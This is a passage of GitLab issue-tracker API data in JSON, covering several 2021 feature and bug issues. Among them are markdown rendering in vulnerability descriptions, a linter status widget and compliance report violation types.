management","section::dev","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":5965371,"username":"jlear","name":"Jake Lear","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5965371/avatar.png","web_url":"https://gitlab.com/jlear"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346039","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346039","notes":"https://gitlab.com/api/v4/projects/278964/issues/346039/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346039/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346039","relative":"#346039","full":"gitlab-org/gitlab#346039"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7110,"epic":{"id":382837,"iid":7110,"title":"🚀 Create a new Task work item from Markdown Task","url":"/groups/gitlab-org/-/epics/7110","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":97568203,"iid":346038,"project_id":278964,"title":"Notify users about unavailable linter in the linter widget instead of a 500 error alert","description":"Related to #345156.\n\n## 🧩 Problem\n\nWhen the Linter is down, we show a 500 error at the top of the pipeline editor page.\n\nAn alert showing up at the top of the editor can be disruptive to one's workflow and ideally should only be used if we need to draw the user's attention to it so they're aware of an important problem and/or need to take action. A global page alert also usually means a global problem, and here we have a problem specific to the Linter.\n\nFurthermote, if a 500 error occurs with a given config, and the user keep typing, it is **very** likely that the same error will occur multiple times within 10 seconds. We allow dismissing the error alert banner but it is very likely that after dismissing the alert, in the process of typing if the error happens again and the banner shows up again. \n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/74543 fixes the constant scrolling up of page every time the error occurs and alert banner shows up. But in case the user chooses to dismiss the banner, it doesn't show up until a new type of error occurs. There's a chance this can leave the users wondering why the config isn't valid if the alert banner stops showing up. \n\nFor more context about the problem see [this thread.](https://gitlab.com/gitlab-org/gitlab/-/issues/346038#note_751904531)\n\n## ✨Proposal\n\n- Remove the 500 error alert when it's caused by the Linter not being available\n- Show the Linter status in the linter widget instead (see the mock-up below). \n- Show an error alert inside the lint tab when the Linter is not available.\n\n#### :triangular_ruler: Linter widget status specs\n\n- `Configuration validation currently not available. [Learn more]()`\n- `Learn more` link should take you to the troubleshooting section in the pipeline editor or Linter docs.\n- Use `timeout` icon in `gray-500`\n\n|  | \n| ------ | \n| ![linter_status_unavailable](/uploads/45ea03d39b59f064ecaf2474772377b6/linter_status_unavailable.png) |\n\n#### :triangular_ruler: Lint tab alert specs\n\n- Use an error alert variant (non-dismissable, it'll show as long as the problem with the Linter persists and the alert should disappear when the Linter becomes available).\n- `Configuration validation currently not available. [Learn more]()`\n- `Learn more` link should take you to the troubleshooting section in the pipeline editor or Linter docs.\n\n## Documentation\n\nThis issue requires documentation. `Learn more` link should take you to the troubleshooting section in the pipeline editor or Linter docs where one can learn more about what could cause the linter to be unavailable. It should reassure the user that it doesn't mean that there are problems with configuration.","state":"closed","created_at":"2021-11-18T16:11:26.119Z","updated_at":"2022-01-11T15:00:42.181Z","closed_at":"2022-01-10T18:54:31.758Z","closed_by":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"labels":["Category:Pipeline Authoring","Technical Writing","UX","UX debt","Verify candidate","auto updated","candidate::14.7","devops::verify","documentation","frontend","group::pipeline authoring","needs weight","section::ops","severity::3","type::feature","workflow::in dev"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"}],"author":{"id":6115425,"username":"v_mishra","name":"Veethika M","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f09a3a0badac17a57e28b4e18a45c1c0?s=80\u0026d=identicon","web_url":"https://gitlab.com/v_mishra"},"type":"ISSUE","assignee":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346038","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346038","notes":"https://gitlab.com/api/v4/projects/278964/issues/346038/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346038/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346038","relative":"#346038","full":"gitlab-org/gitlab#346038"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97559972,"iid":346014,"project_id":278964,"title":"Vulnerability details pages: Support markdown in vulnerability description field","description":"### Proposal\n\nAllow rendering of markdown when present in the Description field of Vulnerability details Page.\n\n### Notes\n\nWhen markdown isn't present/used, a Description will render as plain text (current behavior).\n\n### Scope\n\n#### Example Page\n\nhttps://gitlab.com/gitlab-examples/security/security-reports/-/security/vulnerabilities/8138869\n\n#### Screenshot\n\n![image](https://gitlab.com/groups/gitlab-org/-/uploads/a03c7d8ea647bd2d4815d2818f507cdf/image.png)\n\n### Implementation Plan\n\n- [ ] Add fetch request to [markdown api](app/assets/javascripts/api/markdown_api.js)\n- [ ] Add render component\n- [ ] Show a skeleton loader while markdown is being processed\n- [ ] Add specs\n\nTip: Reference MR - https://gitlab.com/gitlab-org/gitlab/-/merge_requests/62788/diffs","state":"closed","created_at":"2021-11-18T14:05:24.041Z","updated_at":"2022-08-02T20:53:56.310Z","closed_at":"2022-03-03T08:02:27.028Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Deliverable","GitLab Ultimate","UX","devops::secure","feature::addition","frontend","group::analyzer frontend","section::sec","type::feature","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"}],"author":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346014","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346014","notes":"https://gitlab.com/api/v4/projects/278964/issues/346014/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346014/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346014","relative":"#346014","full":"gitlab-org/gitlab#346014"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7158,"epic":{"id":389384,"iid":7158,"title":"Allow markdown in vulnerability description field","url":"/groups/gitlab-org/-/epics/7158","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":97559956,"iid":346013,"project_id":278964,"title":"Pipeline security widget: Support markdown in vulnerability description field","description":"### Proposal\n\nAllow rendering of markdown when present in the Description field of Vulnerability in Pipeline security widget modal.\n\n### Notes\n\nWhen markdown isn't present/used, a Description will render as plain text (current behavior).\n\n### Scope\n\n#### Example Page\n\nhttps://gitlab.com/gitlab-examples/security/security-reports/-/pipelines/285368334/?reportType=DAST\n\n#### Screenshot\n\n![image](https://gitlab.com/groups/gitlab-org/-/uploads/78c206de77ebea06449f5726d9ff741c/image.png)\n\n### Implementation Plan\n\n- [ ] Add fetch request to [markdown api](app/assets/javascripts/api/markdown_api.js)\n- [ ] Add render component\n- [ ] Show a skeleton loader while markdown is being processed\n- [ ] Add specs","state":"closed","created_at":"2021-11-18T14:05:02.153Z","updated_at":"2022-01-21T06:37:27.002Z","closed_at":"2022-01-11T09:33:28.653Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Deliverable","GitLab Ultimate","devops::secure","feature::addition","group::analyzer frontend","missed-deliverable","missed:14.6","section::sec","type::feature","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"}],"author":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346013","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346013","notes":"https://gitlab.com/api/v4/projects/278964/issues/346013/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346013/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346013","relative":"#346013","full":"gitlab-org/gitlab#346013"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7158,"epic":{"id":389384,"iid":7158,"title":"Allow markdown in vulnerability description field","url":"/groups/gitlab-org/-/epics/7158","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":97559914,"iid":346012,"project_id":278964,"title":"MR Security Widget: Support markdown in vulnerability description field","description":"### Proposal\n\nAllow rendering of markdown when present in the Description field of Vulnerability in MR Security widget modal.\n\n### Notes\n\nWhen markdown isn't present/used, a Description will render as plain text (current behavior).\n\n### Scope\n\n#### Example Page\n\nhttps://gitlab.com/gitlab-examples/security/security-reports/-/merge_requests/71\n\n#### Screenshot\n\n![image](https://gitlab.com/groups/gitlab-org/-/uploads/e4adccc0482ed3be8b810874b451f523/image.png)\n\n### Implementation Plan\n\n- [ ] Add fetch request to [markdown api](app/assets/javascripts/api/markdown_api.js)\n- [ ] Add render component\n- [ ] Show a skeleton loader while markdown is being processed\n- [ ] Add specs","state":"closed","created_at":"2021-11-18T14:04:26.525Z","updated_at":"2022-02-14T08:48:11.724Z","closed_at":"2022-02-14T08:48:11.707Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Deliverable","GitLab Ultimate","devops::secure","feature::addition","group::analyzer frontend","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"}],"author":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346012","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346012","notes":"https://gitlab.com/api/v4/projects/278964/issues/346012/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346012/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346012","relative":"#346012","full":"gitlab-org/gitlab#346012"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7158,"epic":{"id":389384,"iid":7158,"title":"Allow markdown in vulnerability description field","url":"/groups/gitlab-org/-/epics/7158","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97559174,"iid":346011,"project_id":278964,"title":"Add additional out of scope compliance report violation types","description":"## Problem to solve\n\nThe basic violation types were added in \u00267222+ and \u00266870+.\n\nThis issue is to add additional out of scope compliance report violations listed in the epic https://gitlab.com/groups/gitlab-org/-/epics/5237#out-of-scope.\n\n## Proposed solution\n\nCreate components that can display the following violations:\n\n- Pushed to a protected branch\n- CI status \n- Code coverage report \n- Security report \n- Performance report \n- Missing linked issue\n- Last completed pipeline status\n\n## Design\n\n![Page_1_](https://gitlab.com/groups/gitlab-org/-/uploads/dc8f1c53a81cf7c4bffc90c82c39979c/Page_1_.png)\n\n## Implementation\n\n~backend :three: - _we'll have to add a lot of violation types_\n\n1. Add violation types to http://gitlab.com/gitlab-org/gitlab/blob/master/ee/lib/gitlab/compliance_management/violations\n2. Make sure the GraphQL endpoint can pass the new types and any additional info needed for these types\n3. Add new specs\n\n~frontend :three: - _we'll have to create a lot of components_\n\n1. Create components to display the following violation types:\n   1. Protected branch: Link to branch ([`GlLink`](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-link--default-link))\n   1. CI status: Render ci status (reuse GitLab component)\n   1. Code coverage report: Render report (reuse MR widget component)\n   1. Security report: Render report (reuse MR widget component)\n   1. Performance report: Render report (reuse MR widget component)\n   1. Missing linked issue: Text body\n   1. Last completed pipeline status: pipeline status (reuse GitLab component)\n1. Add specs to confirm that violations are displayed correctly","state":"closed","created_at":"2021-11-18T13:56:20.034Z","updated_at":"2022-03-22T10:46:24.146Z","closed_at":"2022-03-22T10:46:23.764Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Category:Compliance Management","Enterprise Edition","GitLab Ultimate","backend","devops::manage","feature flag","feature::addition","frontend","group::compliance","section::dev","type::feature","workflow::problem validation"],"milestone":null,"assignees":[],"author":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346011","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346011","notes":"https://gitlab.com/api/v4/projects/278964/issues/346011/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346011/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346011","relative":"#346011","full":"gitlab-org/gitlab#346011"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5237,"epic":{"id":184672,"iid":5237,"title":"Convert compliance dashboard into an insightful report","url":"/groups/gitlab-org/-/epics/5237","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97554275,"iid":346003,"project_id":278964,"title":"Box shadow for gl-link items in the nav should be outline instead","description":"The following discussion from !74551 should be addressed:\n\n- [ ] @dstull started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74551#note_733839166):  (+6 comments)\n\n    \u003e @kcomoli since you designed this one from what I can see in https://gitlab.com/gitlab-org/gitlab/-/issues/213376/designs/Trial_status_1st_steps.jpg\n    \u003e \n    \u003e Can you give the change of styling of what happens on focus/hover as described in [the screenshots](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74551#screenshots-or-screen-recordings) a review?","state":"closed","created_at":"2021-11-18T12:42:38.392Z","updated_at":"2021-12-14T13:55:13.534Z","closed_at":"2021-12-14T13:55:13.505Z","closed_by":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"labels":["auto updated","devops::growth","group::acquisition","section::growth","type::feature","workflow::in review"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"}],"author":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"type":"ISSUE","assignee":{"id":3841241,"username":"dstull","name":"Doug Stull","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c2d7b8532bca28f593b193b012841a40?s=80\u0026d=identicon","web_url":"https://gitlab.com/dstull"},"user_notes_count":5,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346003","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346003","notes":"https://gitlab.com/api/v4/projects/278964/issues/346003/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346003/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346003","relative":"#346003","full":"gitlab-org/gitlab#346003"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97528907,"iid":345987,"project_id":278964,"title":"Code coverage visualization not appearing in Inline Diff view","description":"Similar to #297569. Related to https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5931\n\n## Problem\n\nThe `pg_wal_lsn_diff` has no coverage, so there should be red bar. But no bars are showing up\n\n![Screen_Shot_2021-11-18_at_7.27.49_PM](/uploads/886940969e8f6f2a7a2886be7ea762a6/Screen_Shot_2021-11-18_at_7.27.49_PM.png)\n\nFor comparison, if I switch to the side-by-side view, the coverage bars show up, but the bars seem off-by-one\n\n![Screen_Shot_2021-11-18_at_9.03.39_PM](/uploads/3a87875ecc2da7610e52e982023c72de/Screen_Shot_2021-11-18_at_9.03.39_PM.png)\n\nYou can see the diff in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74759/diffs\n\n## What do I expect to see\n\n1. The code coverage bars show up in both the Inline, and Side-by-side diff views\n1. A much more prominent warning appears when lines **do not** have any coverage (see https://gitlab.com/gitlab-org/gitlab/-/issues/345962 for why)","state":"closed","created_at":"2021-11-18T08:06:34.462Z","updated_at":"2022-02-09T22:11:21.022Z","closed_at":"2022-01-07T09:36:35.724Z","closed_by":{"id":724395,"username":"katrinleinweber","name":"Katrin Leinweber","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/724395/avatar.png","web_url":"https://gitlab.com/katrinleinweber"},"labels":["Category:Code Testing and Coverage","[deprecated] Accepting merge requests","devops::verify","frontend","group::pipeline insights","priority::3","section::ops","severity::4","type::bug","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"}],"author":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"type":"ISSUE","assignee":{"id":3374280,"username":"mfluharty","name":"Miranda Fluharty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3374280/avatar.png","web_url":"https://gitlab.com/mfluharty"},"user_notes_count":7,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345987","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345987","notes":"https://gitlab.com/api/v4/projects/278964/issues/345987/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345987/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345987","relative":"#345987","full":"gitlab-org/gitlab#345987"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97526882,"iid":345981,"project_id":278964,"title":"GitLab JavaScript Style Guide Presentation","description":"Create a slide deck and video presentation no longer than 15 minutes covering GitLab JavaScript Style Guide in support of https://gitlab.com/gitlab-com/people-group/learning-development/advanced-software-engineering/-/issues/21","state":"closed","created_at":"2021-11-18T07:15:59.602Z","updated_at":"2021-12-17T11:38:54.460Z","closed_at":"2021-12-17T11:38:54.433Z","closed_by":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"labels":["auto updated","devops::manage","frontend","group::optimize","section::dev","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"}],"author":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"type":"ISSUE","assignee":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-12-17","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345981","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345981","notes":"https://gitlab.com/api/v4/projects/278964/issues/345981/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345981/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345981","relative":"#345981","full":"gitlab-org/gitlab#345981"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97520645,"iid":345974,"project_id":278964,"title":"Create ecosystem process for stewardship of GraphQL deprecation removals","description":"This issue is part of the Epic https://gitlab.com/groups/gitlab-org/-/epics/7155. Please see that Epic for more context.\n\n### About\n\nThis issue is currently a ~meta issue to gather ideas on how ~\"devops::ecosystem\" can oversee the removal of deprecated schema from the GraphQL API. Ideally, the process should be light and reliable.\n\nSome ideas that came out of https://gitlab.com/gitlab-org/gitlab/-/issues/334278#note_735087926 to support 